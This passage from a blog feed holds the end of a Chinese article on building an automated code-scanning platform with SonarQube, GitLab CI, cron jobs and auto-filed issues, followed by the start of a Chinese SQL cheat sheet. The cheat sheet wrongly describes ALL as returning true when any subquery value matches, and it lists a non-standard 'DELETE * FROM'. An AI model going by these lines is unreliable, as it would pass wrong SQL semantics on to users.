语言与项目统计</strong></p><p>按照年份进行项目的语言统计</p><p><img src="\assets\img\auto_scan\15.png" alt=""></p><p><strong>2.4.2 周期性漏洞统计</strong></p><blockquote><p>每季度漏洞数对比</p></blockquote><p>季度统计是为了对比同一段时期的漏洞数。</p><p><img src="\assets\img\auto_scan\16.png" alt=""></p><blockquote><p>高危漏洞趋势图</p></blockquote><p>高危漏洞环比，今年实施的安全政策是否合乎预期，可以大概分析出来。</p><p><img src="\assets\img\auto_scan\17.png" alt=""></p><h3 id="3-API接口"><a href="#3-API接口" class="headerlink" title="3 API接口"></a>3 API接口</h3><h4 id="3-1-接口认证"><a href="#3-1-接口认证" class="headerlink" title="3.1 接口认证"></a>3.1 接口认证</h4><p>使用 rest_framework 的 API 来做验证，首先根据登陆的用户 id 生成一个 Token。</p><p><img src="\assets\img\auto_scan\18.png" alt=""></p><p>验证接口使用说明，添加 Authorization 的认证 Token。</p><p><img src="\assets\img\auto_scan\19.png" alt=""></p><h4 id="3-2-项目信息接口"><a href="#3-2-项目信息接口" class="headerlink" title="3.2 项目信息接口"></a>3.2 项目信息接口</h4><p><strong>信息同步</strong></p><p>为什么需要信息同步？这是因为 GitLab 中的项目名称可能不是最终上线的 APP 名称(这里有些绕)。拿一个 Java 的项目举例，该项目的 GitLab 地址为：<a href="http://git.companyname.com/A/cloud，那么这个Java的包名有可能是" target="_blank" rel="noopener">http://git.companyname.com/A/cloud，那么这个Java的包名有可能是</a> com.companyname.cloud。</p><p>我们使用项目的 git 地址来同步信息，建议把 git 地址全部转换为小写。APP 的名称(包名)可以 CI/CD 系统获取或是通过配置文件的硬编码方式来定义。</p><p><img src="\assets\img\auto_scan\20.png" alt=""></p><p><strong>创建扫描</strong></p><p>信息同步完成后，我们就可以根据 APP 名称和 git 地址来创建一个扫描任务，请求参数参考如下：</p><ul><li>app_name: APP名称(可选)</li><li>module_name: 模块名称(可选)</li><li>version: 当前版本(可选)</li><li>git_url: git地址 (必选)</li><li>branch_name: 分支名称(必选)</li></ul><h4 id="3-3-任务信息接口"><a href="#3-3-任务信息接口" class="headerlink" title="3.3 任务信息接口"></a>3.3 任务信息接口</h4><ul><li><p>查询扫描任务</p><p>  根据项目的 git 地址、分支来查询扫描任务，你也可以根据上一步创建扫描任务的 ID 来查询扫描结果。</p></li><li><p>查询任务漏洞列表</p><p>  当扫描任务状态为扫描完成/扫描失败时，就可以根据任务 ID 来查询扫描出的安全漏洞信息。</p></li></ul><h4 id="3-4-漏洞规则接口"><a href="#3-4-漏洞规则接口" class="headerlink" title="3.4 漏洞规则接口"></a>3.4 漏洞规则接口</h4><ul><li><p>查询漏洞规则知识</p><p>  通过漏洞信息中的漏洞规则 ID 或者 Key 来查询相关的规则知识库，该知识库应当包括：漏洞原因、漏洞示例代码、解决修复意见等。</p></li></ul><h3 id="4-后台服务"><a href="#4-后台服务" class="headerlink" title="4 后台服务"></a>4 后台服务</h3><h4 id="4-1-gitlab-的信息同步"><a href="#4-1-gitlab-的信息同步" class="headerlink" title="4.1 gitlab 的信息同步"></a>4.1 gitlab 的信息同步</h4><p>使用 crontab 每两个小时遍历一遍 GitLab 上的所有项目，并同步项目信息到扫描系统中。</p><p><img src="\assets\img\auto_scan\21.png" alt=""></p><h4 id="4-2-报表生成服务"><a href="#4-2-报表生成服务" class="headerlink" title="4.2 报表生成服务"></a>4.2 报表生成服务</h4><p>使用 crontab 每日凌晨12点生成，季度对比和年度的安全统计数据。</p><h4 id="4-3-扫描进程监控"><a href="#4-3-扫描进程监控" class="headerlink" title="4.3 扫描进程监控"></a>4.3 扫描进程监控</h4><p>使用ps aux| grep codescan来查看进程是否存活，当然这种暴力方式不能检测到进程的业务健康度的(比如：扫描任务卡死，状态一直为：正在扫描)。</p><h3 id="5-SonarQube-搭建"><a href="#5-SonarQube-搭建" class="headerlink" title="5 SonarQube 搭建"></a>5 SonarQube 搭建</h3><h4 id="5-1-服务搭建"><a href="#5-1-服务搭建" class="headerlink" title="5.1 服务搭建"></a>5.1 服务搭建</h4><p>下载最新版本<a href="https://www.sonarqube.org/downloads/上传到sonarqube.codeauit服务器上并解压。进入到bin/linux-x86-64/目录下，执行" target="_blank" rel="noopener">https://www.sonarqube.org/downloads/上传到sonarqube.codeauit服务器上并解压。进入到bin/linux-x86-64/目录下，执行</a> sh ./sonar.sh start。 SonarQube 启动成功后，使用浏览器打开<a href="http://192.168.10.3:9000" target="_blank" rel="noopener">http://192.168.10.3:9000</a>, 输入 admin/admin 即可正常访问。</p><h4 id="5-2-插件管理"><a href="#5-2-插件管理" class="headerlink" title="5.2 插件管理"></a>5.2 插件管理</h4><p>SonarQube 6.4 版本登陆的后台管理系统，选择 “配置” -&gt; “系统” -&gt; “更新中心” ， 选择对应插件点击 “Install” 进行安装。</p><p>SonarQube 7.3 版本， “Administration” -&gt; “Marketplace”， 选择对应插件点击 “Install” 进行安装。</p><p><img src="\assets\img\auto_scan\22.png" alt=""></p><h3 id="6-引擎调度"><a href="#6-引擎调度" class="headerlink" title="6 引擎调度"></a>6 引擎调度</h3><p>程序部署在 “task.codeaudit” 服务器上，服务需要安装 cloc 与 sonar-scanner 工具。</p><h4 id="6-1-代码同步"><a href="#6-1-代码同步" class="headerlink" title="6.1 代码同步"></a>6.1 代码同步</h4><p>同步代码分为以下几个步骤：</p><ul><li><p>克隆项目</p><p>  这里可能会遇到一些坑，比如项目历史比较久远，完整克隆下来可能会达到上百M或G，我们这里可以使用–depth 1参数进行克隆下载。有的项目可能会存在不规范的情况，比如拿 git 当 svn 使用，每个版本创建一个目录。</p></li><li><p>切换分支</p><p>  根据扫描任务中的分支名称 checkout 到指定分支。</p></li><li><p>更新代码</p><p>  针对已经克隆的项目进行 pull 操作，来同步 GitLab 上的项目更新代码。</p></li></ul><h4 id="6-2-sonar-scanner-扫描"><a href="#6-2-sonar-scanner-扫描" class="headerlink" title="6.2 sonar-scanner 扫描"></a>6.2 sonar-scanner 扫描</h4><p>ssh 登录到task.codeaudit服务器上，执行cd opt &amp;&amp; wget <a href="https://sonarsource.bintray.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip" target="_blank" rel="noopener">https://sonarsource.bintray.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip</a> &amp;&amp; unzip sonar-scanner-cli-3.2.0.1227-linux.zip来下载并解压，执行成功后使用ln -s /opt/sonar-scanner-3.2.0.1227-linux/bin/sonar-scanner /usr/bin/sonar-scanner命令创建一个sonar-scanner 的软连接。这里我们会使用sonar-scanner命令来进行项目的代码扫描。</p><p>你也可以通过<a href="https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner来下载不同平台的sonar-scanner-cli-3.2.0.1227-linux.zip。" target="_blank" rel="noopener">https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner来下载不同平台的sonar-scanner-cli-3.2.0.1227-linux.zip。</a></p><p><img src="\assets\img\auto_scan\23.png" alt=""></p><h4 id="6-3-代码统计"><a href="#6-3-代码统计" class="headerlink" title="6.3 代码统计"></a>6.3 代码统计</h4><p>使用cloc工具进行文件与代码行数的统计, 这里你可能需要通过–exclude-ext、–exclude-dir参数来过滤一些无意义的文件，比如：字体、图片、声音、视频等。举个例子，过滤所有图片后统计：cloc ./目标路径 –exclude-ext=.jpg,.jpeg,.png,.bmp,.gif,.ico。</p><h4 id="6-4-项目组件分析"><a href="#6-4-项目组件分析" class="headerlink" title="6.4 项目组件分析"></a>6.4 项目组件分析</h4><p>组件分析主要是针对如使用 Java 语言开发项目时使用 Maven 管理的 pom.xml 配置文件; Python 中的 requirements.txt 文件；JS 项目中的package.json文件做解析。这里我写了一个clocwalk 工具可以分析项目的依赖组件，这个项目目前已经开源，你可以通过<a href="https://github.com/MyKings/clocwalk地址来获取这个工具。" target="_blank" rel="noopener">https://github.com/MyKings/clocwalk地址来获取这个工具。</a></p><h4 id="6-5-漏报处理"><a href="#6-5-漏报处理" class="headerlink" title="6.5 漏报处理"></a>6.5 漏报处理</h4><p>关于漏报问题，你可以根据自己企业 SRC 中的漏洞，总结出一套适合自己企业的黑名单规则；或者你可以添加一些 CWE 的漏洞规则，关于 CWE 的信息你可以访问这个地址 <a href="https://cwe.mitre.org/data/index.html。" target="_blank" rel="noopener">https://cwe.mitre.org/data/index.html。</a></p><h4 id="6-6-误报处理"><a href="#6-6-误报处理" class="headerlink" title="6.6 误报处理"></a>6.6 误报处理</h4><p>关于误报问题可能会较多，比如扫描出单元测试或功能测试的硬编码问题；比如变量参数String PARAM_NAME_PASSWORD=”passwd_txt”;问题。 以上的问题我们可以通过白名单插件处理，比如插件中对文件路径和方法判断是否存在 test 关键字，如果存在我们就认为这个是误报。另外针对某些特殊类型的误报，比如在 A 项目下才是误报，其他项目就是漏洞的情况，我们可以设置这个项目的白名单漏洞 Case，其匹配规则条件为：项目名称、漏洞文件、漏洞类型、漏洞所在行，当所有条件都同时满足时，那么这个漏洞就会可以判断为误报。</p><h4 id="6-7-漏洞闭环"><a href="#6-7-漏洞闭环" class="headerlink" title="6.7 漏洞闭环"></a>6.7 漏洞闭环</h4><p>当一个高/中危漏洞被发现并确认时，我们应该如何跟踪这个漏洞的生命周期？往往安全人员会将一个漏洞提交到内部的 SOC 系统中，由于 SOC 系统没有和项目开发的流程控制系统（如：Jira）没有直接联系，开发人员可能会忽视或忘记修复这个高危漏洞，如何避免这种情况？我们这里以 GitLab 举例，当扫描系统扫描出高危漏洞时，系统会通过 GitLab 的 POST /projects/:id/issues API接口来自动创建一条 issue 并指派给当前项目的 master，项目负责人同时会收到一条邮件提醒，那么项目负责人可根据漏洞严重程度来安排项目的迭代计划，这样我们就把审计系统扫描出的漏洞与项目开发流程很好的结合起来了。</p><h3 id="7-GitLab-CI-触发"><a href="#7-GitLab-CI-触发" class="headerlink" title="7 GitLab CI 触发"></a>7 GitLab CI 触发</h3><p>当然也可以使用 Jenkins 来做 CI/CD 系统。我们这里开发了一个.code-audit.py触发脚本, Jenkins 你也可以使用 Python 脚本或是开发 Jenkins 插件来达到触发目的。</p><h4 id="7-1-配置项目"><a href="#7-1-配置项目" class="headerlink" title="7.1 配置项目"></a>7.1 配置项目</h4><p>这里需要了解 .gitlab-ci.yml 文件格式的编写，下面是一个 Python 项目的配置。可以看出整个 CI 过程分为 4 个阶段：build、test、codeaudit、deploy。 其中codeaudit是我们的代码扫描阶段，这里我们限制了只有 develop 的动作才会触发扫描。</p><p><img src="\assets\img\auto_scan\24.png" alt=""></p><h4 id="7-2-扫描脚本"><a href="#7-2-扫描脚本" class="headerlink" title="7.2 扫描脚本"></a>7.2 扫描脚本</h4><p>触发扫描脚本如下图，其大体的执行流程如下：</p><ul><li>获取 GitLab CI 中关于项目的环境变量信息；</li><li>设定要拦截的漏洞级别，默认：中、高危漏洞不通过测试；</li><li>同步项目信息到扫描系统，如果失败扫描代码不通过；</li><li>创建扫描任务，如果失败扫描代码不通过；</li><li>异步查询扫描结果，超时时间10分钟，如果超时扫描代码不通过；</li><li>扫描结果完成，统计是否存在预定义级别的漏洞，如果存在扫描代码不通过。</li></ul><p><img src="\assets\img\auto_scan\25.png" alt=""></p><p>下图为整个 CI 过程的截图。</p><p><img src="\assets\img\auto_scan\26.png" alt=""></p><p>下图为代码扫描失败的反馈结果，图中可以看出发现了一个漏洞。</p><p><img src="\assets\img\auto_scan\27.png" alt=""></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>代码扫描固然重要，但是它不会解决所有项目的安全问题。项目安全应该从多个维度、多角度的来进行。如：项目立项时开始SDL；开发迭代过程中的代码扫描；项目上线前的黑盒测试。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://mp.weixin.qq.com/s/tSbWhBh9RQQ5Wduoo18MEg" target="_blank" rel="noopener">代码自动化扫描系统的建设（上）</a></li><li><a href="https://mp.weixin.qq.com/s/4XtIWbkIeCjbNWT2VCFHZg" target="_blank" rel="noopener">代码自动化扫描系统的建设（下）</a></li><li><a href="https://baike.baidu.com/item/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90" target="_blank" rel="noopener">CI (持续集成)</a></li><li><a href="https://baike.baidu.com/item/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98" target="_blank" rel="noopener">CD (持续交付)</a></li><li><a href="https://www.owasp.org/index.php/Top_10-2017_Top_10" target="_blank" rel="noopener">OWASP 2017 TOP 10</a></li><li><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a></li><li><a href="https://git-scm.com/docs" target="_blank" rel="noopener">https://git-scm.com/docs</a></li><li><a href="https://docs.gitlab.com/ee/api/" target="_blank" rel="noopener">https://docs.gitlab.com/ee/api/</a></li><li><a href="https://about.gitlab.com/features/gitlab-ci-cd/" target="_blank" rel="noopener">https://about.gitlab.com/features/gitlab-ci-cd/</a></li><li><a href="https://docs.gitlab.com/ce/ci/yaml/README.html" target="_blank" rel="noopener">https://docs.gitlab.com/ce/ci/yaml/README.html</a></li><li><a href="https://docs.gitlab.com/ce/ci/examples/README.html" target="_blank" rel="noopener">https://docs.gitlab.com/ce/ci/examples/README.html</a></li><li><a href="https://docs.gitlab.com/ee/api/issues.html" target="_blank" rel="noopener">https://docs.gitlab.com/ee/api/issues.html</a></li><li><a href="https://docs.gitlab.com/runner/install/docker.html" target="_blank" rel="noopener">https://docs.gitlab.com/runner/install/docker.html</a></li><li><a href="https://docs.sonarqube.org/display/DEV/Web+API" target="_blank" rel="noopener">https://docs.sonarqube.org/display/DEV/Web+API</a></li><li><a href="https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization" target="_blank" rel="noopener">https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization</a></li><li><a href="https://www.sonarqube.org/downloads/" target="_blank" rel="noopener">https://www.sonarqube.org/downloads/</a></li><li><a href="https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner" target="_blank" rel="noopener">https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner</a></li><li><a href="https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf" target="_blank" rel="noopener">https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf</a></li><li><a href="https://github.com/MyKings/clocwalk" target="_blank" rel="noopener">https://github.com/MyKings/clocwalk</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转自 &lt;a href=&quot;https://mp.weixin.qq.com/s/tSbWhBh9RQQ5Wduoo18MEg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;代码自动化扫描系统的建设- 唯品会安全应急响应中心&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;h3 id=&quot;为什么需要自动化扫描？&quot;&gt;&lt;a href=&quot;#为什么需要自动化扫描？&quot; class=&quot;headerlink&quot; title=&quot;为什么需要自动化扫描？&quot;&gt;&lt;/a&gt;为什么需要自动化扫描？&lt;/h3&gt;&lt;p&gt;互联网的快速发展，程序员是功不可没的。从软件开发的瀑布模型到现在的敏捷开发, 软件的开发周期从数年到数月、从数月到数天，时间不断变换缩减。传统的代码扫描方式已经不能跟进新时代的软件开发流程中，这就需要改变我们的代码扫描方式，它应该在有限的时间内尽量发现足够多的安全问题，并能够结合 [&lt;code&gt;CI (持续集成)&lt;/code&gt;]来触发代码扫描。&lt;/p&gt;
&lt;h3 id=&quot;自动化扫描时扫描引擎用什么？&quot;&gt;&lt;a href=&quot;#自动化扫描时扫描引擎用什么？&quot; class=&quot;headerlink&quot; title=&quot;自动化扫描时扫描引擎用什么？&quot;&gt;&lt;/a&gt;自动化扫描时扫描引擎用什么？&lt;/h3&gt;
    
    </summary>
    
      <category term="安全建设" scheme="http://pa55w0rd.github.io/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="代码扫描" scheme="http://pa55w0rd.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/"/>
    
      <category term="平台建设" scheme="http://pa55w0rd.github.io/tags/%E5%B9%B3%E5%8F%B0%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>SQL 速查表</title>
    <link href="http://pa55w0rd.github.io/quick-SQL-cheatsheet/"/>
    <id>http://pa55w0rd.github.io/quick-SQL-cheatsheet/</id>
    <published>2018-10-19T09:24:03.000Z</published>
    <updated>2018-11-20T10:37:30.844Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><ol><li><a href="#find"> 查找数据的查询 </a></li><li><a href="#modify"> 修改数据的查询 </a></li><li><a href="#report"> 聚合查询 </a></li><li><a href="#joins"> 连接查询 </a></li><li><a href="#view"> 视图查询 </a></li><li><a href="#alter"> 修改表的查询 </a><br><a href="https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md" target="_blank" rel="noopener">https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md</a></li></ol><a id="more"></a><p><a name="find"></a></p><h1 id="1-查找数据的查询"><a href="#1-查找数据的查询" class="headerlink" title="1. 查找数据的查询"></a>1. 查找数据的查询</h1><h3 id="SELECT-用于从数据库中选择数据"><a href="#SELECT-用于从数据库中选择数据" class="headerlink" title="SELECT: 用于从数据库中选择数据"></a><strong>SELECT</strong>: 用于从数据库中选择数据</h3><ul><li><code>SELECT</code> * <code>FROM</code> table_name;</li></ul><h3 id="DISTINCT-用于过滤掉重复的值并返回指定列的行"><a href="#DISTINCT-用于过滤掉重复的值并返回指定列的行" class="headerlink" title="DISTINCT: 用于过滤掉重复的值并返回指定列的行"></a><strong>DISTINCT</strong>: 用于过滤掉重复的值并返回指定列的行</h3><ul><li><code>SELECT DISTINCT</code> column_name;</li></ul><h3 id="WHERE-用于过滤记录-行"><a href="#WHERE-用于过滤记录-行" class="headerlink" title="WHERE: 用于过滤记录/行"></a><strong>WHERE</strong>: 用于过滤记录/行</h3><ul><li><code>SELECT</code> column1, column2 <code>FROM</code> table_name <code>WHERE</code> condition;</li><li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>AND</code> condition2;</li><li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>OR</code> condition2;</li><li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE NOT</code> condition;</li><li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>AND</code> (condition2 <code>OR</code> condition3);</li><li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE EXISTS</code> (<code>SELECT</code> column_name <code>FROM</code> table_name <code>WHERE</code> condition);</li></ul><h3 id="ORDER-BY-用于结果集的排序，升序（ASC）或者降序（DESC）"><a href="#ORDER-BY-用于结果集的排序，升序（ASC）或者降序（DESC）" class="headerlink" title="ORDER BY: 用于结果集的排序，升序（ASC）或者降序（DESC）"></a><strong>ORDER BY</strong>: 用于结果集的排序，升序（ASC）或者降序（DESC）</h3><ul><li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column;</li><li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column <code>DESC</code>;</li><li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column1 <code>ASC</code>, column2 <code>DESC</code>;</li></ul><h3 id="SELECT-TOP-用于指定从表顶部返回的记录数"><a href="#SELECT-TOP-用于指定从表顶部返回的记录数" class="headerlink" title="SELECT TOP: 用于指定从表顶部返回的记录数"></a><strong>SELECT TOP</strong>: 用于指定从表顶部返回的记录数</h3><ul><li><code>SELECT TOP</code> number columns_names <code>FROM</code> table_name <code>WHERE</code> condition;</li><li><code>SELECT TOP</code> percent columns_names <code>FROM</code> table_name <code>WHERE</code> condition;</li><li>并非所有数据库系统都支持<code>SELECT TOP</code>。 MySQL 中是<code>LIMIT</code>子句</li><li><code>SELECT</code> column_names <code>FROM</code> table_name <code>LIMIT</code> offset, count;</li></ul><h3 id="LIKE-用于搜索列中的特定模式，WHERE-子句中使用的运算符"><a href="#LIKE-用于搜索列中的特定模式，WHERE-子句中使用的运算符" class="headerlink" title="LIKE: 用于搜索列中的特定模式，WHERE 子句中使用的运算符"></a><strong>LIKE</strong>: 用于搜索列中的特定模式，WHERE 子句中使用的运算符</h3><ul><li>% (percent sign) 是一个表示零个，一个或多个字符的通配符</li><li>_ (underscore) 是一个表示单个字符通配符</li><li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>LIKE</code> pattern;</li><li><code>LIKE</code> ‘a%’    （查找任何以“a”开头的值）</li><li><code>LIKE</code> ‘%a’    （查找任何以“a”结尾的值）</li><li><code>LIKE</code> ‘%or%’  （查找任何包含“or”的值）</li><li><code>LIKE</code> ‘_r%’   （查找任何第二位是“r”的值）</li><li><code>LIKE</code> ‘a_%_%’ （查找任何以“a”开头且长度至少为3的值）</li><li><code>LIKE</code> ‘[a-c]%’（查找任何以“a”或“b”或“c”开头的值）</li></ul><h3 id="IN-用于在-WHERE-子句中指定多个值的运算符"><a href="#IN-用于在-WHERE-子句中指定多个值的运算符" class="headerlink" title="IN: 用于在 WHERE 子句中指定多个值的运算符"></a><strong>IN</strong>: 用于在 WHERE 子句中指定多个值的运算符</h3><ul><li>本质上，IN运算符是多个OR条件的简写</li><li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>IN</code> (value1, value2, …);</li><li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>IN</code> (<code>SELECT STATEMENT</code>);</li></ul><h3 id="BETWEEN-用于过滤给定范围的值的运算符"><a href="#BETWEEN-用于过滤给定范围的值的运算符" class="headerlink" title="BETWEEN: 用于过滤给定范围的值的运算符"></a><strong>BETWEEN</strong>: 用于过滤给定范围的值的运算符</h3><ul><li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>BETWEEN</code> value1 <code>AND</code> value2;</li><li><code>SELECT</code> * <code>FROM</code> Products <code>WHERE</code> (column_name <code>BETWEEN</code> value1 <code>AND</code> value2) <code>AND NOT</code> column_name2 <code>IN</code> (value3, value4);</li><li><code>SELECT</code> * <code>FROM</code> Products <code>WHERE</code> column_name <code>BETWEEN</code> #01/07/1999# AND #03/12/1999#;</li></ul><h3 id="NULL-代表一个字段没有值"><a href="#NULL-代表一个字段没有值" class="headerlink" title="NULL: 代表一个字段没有值"></a><strong>NULL</strong>: 代表一个字段没有值</h3><ul><li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> column_name <code>IS NULL</code>;</li><li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> column_name <code>IS NOT NULL</code>;</li></ul><h3 id="AS-用于给表或者列分配别名"><a href="#AS-用于给表或者列分配别名" class="headerlink" title="AS: 用于给表或者列分配别名"></a><strong>AS</strong>: 用于给表或者列分配别名</h3><ul><li><code>SELECT</code> column_name <code>AS</code> alias_name <code>FROM</code> table_name;</li><li><code>SELECT</code> column_name <code>FROM</code> table_name <code>AS</code> alias_name;</li><li><code>SELECT</code> column_name <code>AS</code> alias_name1, column_name2 <code>AS</code> alias_name2;</li><li><code>SELECT</code> column_name1, column_name2 + ‘, ‘ + column_name3 <code>AS</code> alias_name;</li></ul><h3 id="UNION-用于组合两个或者多个-SELECT-语句的结果集的运算符"><a href="#UNION-用于组合两个或者多个-SELECT-语句的结果集的运算符" class="headerlink" title="UNION: 用于组合两个或者多个 SELECT 语句的结果集的运算符"></a><strong>UNION</strong>: 用于组合两个或者多个 SELECT 语句的结果集的运算符</h3><ul><li>每个 SELECT 语句必须拥有相同的列数</li><li>列必须拥有相似的数据类型</li><li>每个 SELECT 语句中的列也必须具有相同的顺序</li><li><code>SELECT</code> columns_names <code>FROM</code> table1 <code>UNION SELECT</code> column_name <code>FROM</code> table2;</li><li><code>UNION</code> 仅允许选择不同的值, <code>UNION ALL</code> 允许重复</li></ul><h3 id="ANY-ALL-用于检查-WHERE-或-HAVING-子句中使用的子查询条件的运算符"><a href="#ANY-ALL-用于检查-WHERE-或-HAVING-子句中使用的子查询条件的运算符" class="headerlink" title="ANY|ALL: 用于检查 WHERE 或 HAVING 子句中使用的子查询条件的运算符"></a><strong>ANY|ALL</strong>: 用于检查 WHERE 或 HAVING 子句中使用的子查询条件的运算符</h3><ul><li><code>ANY</code> 如果任何子查询值满足条件，则返回 true。</li><li><code>ALL</code> 如果任何子查询值满足条件，则返回 true。</li><li><code>SELECT</code> columns_names <code>FROM</code> table1 <code>WHERE</code> column_name operator (<code>ANY</code>|<code>ALL</code>) (<code>SELECT</code> column_name <code>FROM</code> table_name <code>WHERE</code> condition);</li></ul><h3 id="GROUP-BY-通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列"><a href="#GROUP-BY-通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列" class="headerlink" title="GROUP BY: 通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列"></a><strong>GROUP BY</strong>: 通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列</h3><ul><li><code>SELECT</code> column_name1, COUNT(column_name2) <code>FROM</code> table_name <code>WHERE</code> condition <code>GROUP BY</code> column_name1 <code>ORDER BY</code> COUNT(column_name2) DESC;</li></ul><h3 id="HAVING-HAVING-子句指定-SELECT-语句应仅返回聚合值满足指定条件的行。它被添加到-SQL-语言中，因为WHERE关键字不能与聚合函数一起使用。"><a href="#HAVING-HAVING-子句指定-SELECT-语句应仅返回聚合值满足指定条件的行。它被添加到-SQL-语言中，因为WHERE关键字不能与聚合函数一起使用。" class="headerlink" title="HAVING: HAVING 子句指定 SELECT 语句应仅返回聚合值满足指定条件的行。它被添加到 SQL 语言中，因为WHERE关键字不能与聚合函数一起使用。"></a><strong>HAVING</strong>: HAVING 子句指定 SELECT 语句应仅返回聚合值满足指定条件的行。它被添加到 SQL 语言中，因为WHERE关键字不能与聚合函数一起使用。</h3><ul><li><code>SELECT</code> <code>COUNT</code>(column_name1), column_name2 <code>FROM</code> table <code>GROUP BY</code> column_name2 <code>HAVING</code> <code>COUNT(</code>column_name1<code>)</code> &gt; 5;</li></ul><p><a name="modify"></a></p><h1 id="2-修改数据的查询"><a href="#2-修改数据的查询" class="headerlink" title="2. 修改数据的查询"></a>2. 修改数据的查询</h1><h3 id="INSERT-INTO-用于在表中插入新记录-行"><a href="#INSERT-INTO-用于在表中插入新记录-行" class="headerlink" title="INSERT INTO: 用于在表中插入新记录/行"></a><strong>INSERT INTO</strong>: 用于在表中插入新记录/行</h3><ul><li><code>INSERT INTO</code> table_name (column1, column2) <code>VALUES</code> (value1, value2);</li><li><code>INSERT INTO</code> table_name <code>VALUES</code> (value1, value2 …);</li></ul><h3 id="UPDATE-用于修改表中的现有记录-行"><a href="#UPDATE-用于修改表中的现有记录-行" class="headerlink" title="UPDATE: 用于修改表中的现有记录/行"></a><strong>UPDATE</strong>: 用于修改表中的现有记录/行</h3><ul><li><code>UPDATE</code> table_name <code>SET</code> column1 = value1, column2 = value2 <code>WHERE</code> condition;</li><li><code>UPDATE</code> table_name <code>SET</code> column_name = value;</li></ul><h3 id="DELETE-用于删除表中的现有记录-行"><a href="#DELETE-用于删除表中的现有记录-行" class="headerlink" title="DELETE: 用于删除表中的现有记录/行"></a><strong>DELETE</strong>: 用于删除表中的现有记录/行</h3><ul><li><code>DELETE FROM</code> table_name <code>WHERE</code> condition;</li><li><code>DELETE</code> * <code>FROM</code> table_name;</li></ul><p><a name="report"></a></p><h1 id="3-聚合查询"><a href="#3-聚合查询" class="headerlink" title="3. 聚合查询"></a>3. 聚合查询</h1><h3 id="COUNT-返回出现次数"><a href="#COUNT-返回出现次数" class="headerlink" title="COUNT: 返回出现次数"></a><strong>COUNT</strong>: 返回出现次数</h3><ul><li><code>SELECT COUNT (DISTINCT</code> column_name<code>)</code>;</li></ul><h3 id="MIN-and-MAX-返回所选列的最小-最大值"><a href="#MIN-and-MAX-返回所选列的最小-最大值" class="headerlink" title="MIN() and MAX(): 返回所选列的最小/最大值"></a><strong>MIN() and MAX()</strong>: 返回所选列的最小/最大值</h3><ul><li><code>SELECT MIN (</code>column_names<code>) FROM</code> table_name <code>WHERE</code> condition;</li><li><code>SELECT MAX (</code>column_names<code>) FROM</code> table_name <code>WHERE</code> condition;</li></ul><h3 id="AVG-返回数字列的平均值"><a href="#AVG-返回数字列的平均值" class="headerlink" title="AVG(): 返回数字列的平均值"></a><strong>AVG()</strong>: 返回数字列的平均值</h3><ul><li><code>SELECT AVG (</code>column_name<code>) FROM</code> table_name <code>WHERE</code> condition;</li></ul><h3 id="SUM-返回数值列的总和"><a href="#SUM-返回数值列的总和" class="headerlink" title="SUM(): 返回数值列的总和"></a><strong>SUM()</strong>: 返回数值列的总和</h3><ul><li><code>SELECT SUM (</code>column_name<code>) FROM</code> table_name <code>WHERE</code> condition;</li></ul><p><a name="joins"></a></p><h1 id="4-连接查询"><a href="#4-连接查询" class="headerlink" title="4. 